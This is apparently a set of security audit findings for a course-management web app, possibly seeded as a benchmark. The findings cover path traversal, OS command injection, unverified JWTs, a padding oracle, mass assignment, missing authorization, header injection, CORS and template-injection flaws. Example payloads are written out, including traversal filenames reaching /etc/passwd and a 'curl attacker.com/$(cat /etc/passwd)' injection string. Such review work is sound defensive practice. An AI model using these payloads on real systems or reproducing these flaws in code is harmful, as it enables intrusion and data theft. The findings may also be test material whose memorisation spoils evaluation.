extra.message: saveUploadedFile() derives the stored file's extension from the attacker-controlled File.name (`file.name.split('.').pop()`) and concatenates it directly into the filename passed to path `join(dir, uniqueName)`. If the uploaded filename contains no dot (e.g. '../../../../tmp/evil.sh') or is crafted so the 'extension' portion contains '/..' sequences, the resulting path escapes the intended upload directory. This function is used by uploadCourseResource, uploadSubmissionFile, submitAssignment and replaceSubmission, meaning even a low-privileged student can write files outside the uploads folder via a malicious multipart filename.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: readCourseHandoutFile(folder, filename) joins two fully attacker-controlled strings directly onto HANDOUT_ROOT with no containment check (unlike readArchivedSubmissionFile below it, which resolves and verifies the path stays within baseDir). It is called from src/actions/files.ts downloadCourseHandout(), which only requires the caller to be logged in (any role, including student) and validates folder/filename with a zod schema that merely checks they are non-empty strings. A value like filename='../../../../etc/passwd' lets any authenticated user read arbitrary files from the server's filesystem.

extra.message: saveCourseBannerImage() builds the destination path as `path.join(BANNER_DIR, `${courseId}-${file.name}`)` using the raw, attacker-controlled uploaded File.name, with no allowlist, extension check, or basename sanitization (contrast with saveProfileAvatarImage() just below, which enforces a MIME allowlist, a size cap, and writes under a randomUUID()-generated name). A crafted file.name containing '../' sequences lets an instructor/admin write the uploaded file outside the course-banners directory.

extra.message: convertGradeExportToFormat() builds a shell command string by directly interpolating sourceCsvPath and reportType and executes it with `spawn('bash', ['-c', cmd], { shell: true })`. reportType is taken unchecked from formData.get('reportType') in src/actions/admin.ts exportGradesCsv() (no allowlist, unlike the sibling convertSubmissionsReportToFormat() which validates against ALLOWED_REPORT_TYPES and uses shell:false with an argument array). An instructor/admin can submit a reportType such as `csv; curl attacker.com/$(cat /etc/passwd)` to execute arbitrary OS commands on the server.

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: processAllocation() decodes the partner assertion token with `decodeJwt()`, which parses the JWT payload without verifying its signature, then trusts the embedded role/cohortId claims to decide whether to return the full per-seat cost/roster breakdown. It is reachable unauthenticated via GET /api/partner/cost-allocation (assertion taken straight from the Authorization header) and via viewPartnerCostAllocation() in src/actions/partner-allocation.ts. Any caller can forge an unsigned/arbitrary JWT with `role: "sponsor"` and any `cohortId` to obtain the full enrollment/seat data for any cohort. The sibling handleResourceCheck() (same file) correctly calls `jwtVerify()` against PARTNER_SECRET, confirming this is a real, contrasting flaw.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: decryptExamAnswerKeyPackage() uses unauthenticated AES-256-CBC and distinguishes padding/decrypt failures ('Malformed package padding') from other errors ('Package could not be decrypted') in its response, exposed via POST /api/grading/answer-key-package. This distinct-error behavior is the classic signature of a padding-oracle vulnerability: repeated ciphertext manipulation plus observation of which error is returned lets an attacker decrypt (or forge) exam answer-key ciphertext without knowing PACKAGE_KEY. The sibling decryptGradebookSnapshot()/encryptGradebookSnapshot() in the same file correctly use AES-256-GCM (AEAD) and return one generic error for every failure, confirming this is the intentionally weaker path.

cwe: CWE-327: Use of a Broken or Risky Cryptographic Algorithm

extra.message: importModuleStructure() spreads each attacker-supplied JSON object from the imported payload directly into the insert: `db.insert(lessons).values({ moduleId, ...lessonData })`. Because the spread comes after the explicit `moduleId` key, a `moduleId` field inside lessonData overrides the verified value, letting an instructor who was authorized only for their own course/module insert lesson rows (including arbitrary content) into a module belonging to a different, unowned course. The sibling importLessonStructure() fixes this by narrowing each row through a zod schema (title/content/orderIndex only) before insert.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: importEnrollmentsCsv() only calls `await requireAuth()` and performs no role check, unlike every other admin action in this file (updateUserRole, toggleUserDisabled, importUsersCsv all check `role !== 'school_admin'`). Any authenticated user, including a student, can therefore POST a CSV to this action and enroll arbitrary users into any cohort with an arbitrary enrollmentRole of 'instructor' or 'teaching_assistant', granting themselves or others elevated course privileges.

When serving a course-resource file, the handler checks only whether the requesting user has ANY row in cohortEnrollments (`eq(cohortEnrollments.userId, user.id)` with no filter on the resource's actual course/cohort). A student enrolled in Course A therefore passes this check and can download resources belonging to any other course B by simply requesting its file path (which is guessable/enumerable since it is only the raw upload path, not a signed URL), bypassing per-course access control.

extra.message: buildAttachmentDisposition() builds the Content-Disposition header value by embedding the caller-supplied `requestedName` verbatim, with no stripping of CR/LF characters, unlike the sibling buildExportDisposition() a few lines below which explicitly does `.replace(/[\r\n]/g, '')`. It is invoked in src/app/api/uploads/[...path]/route.ts with `displayName` taken directly from an unauthenticated-input query parameter, so a value containing `\r\n` can inject additional HTTP response headers or split the response.

extra.message: buildSpotlightCorsHeaders() echoes back whatever Origin header the browser sends as `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`, for the /api/catalog/spotlight-widget endpoint. This allows any website to make a credentialed cross-origin request and read the response together with the visitor's session cookies, defeating the same-origin policy. The sibling buildShowcaseCorsHeaders() correctly restricts this to an explicit allowlist of partner origins.

extra.message: renderCourseAnnouncement() compiles the fully instructor-supplied `layout` string directly with `Handlebars.compile(layout)` and executes it. `layout` is taken unchecked from formData in previewCourseAnnouncement() (src/actions/notifications.ts). Compiling and rendering an attacker/instructor-controlled template string is a server-side template injection sink; Handlebars template expressions can be crafted to reach the constructor/prototype chain and execute arbitrary code on the server. The fixed-layout renderCompletionCertificateMessage() below only ever compiles a hardcoded template, confirming the announcement path is the unsafe one.

extra.message: searchCourseCatalog() returns the raw exception message and full stack trace (`err.stack`) plus the original query to the caller whenever `includeDiagnostics` is true. This is wired up in the completely unauthenticated GET /api/catalog/lookup endpoint, which sets includeDiagnostics based solely on the client-supplied `x-widget-diagnostics: 1` request header. Any unauthenticated internet caller who triggers (or waits for) a query error can obtain internal stack traces revealing file paths and implementation details.

extra.message: viewCohortInsights() grants the 'elevated' individual grade-change history view to any user for whom `canTeachCourse()` returns true, which includes teaching_assistant enrollments, purely based on a client-supplied `dataLevel==='elevated'` form field. The sibling viewCourseInsights() explicitly restricts the same elevated data to users with an actual 'instructor' enrollment role (or school_admin), excluding teaching assistants. A teaching assistant can therefore obtain individually-attributed grade-change history (who changed which student's grade and why) that the parallel, more careful endpoint deliberately withholds from that role.
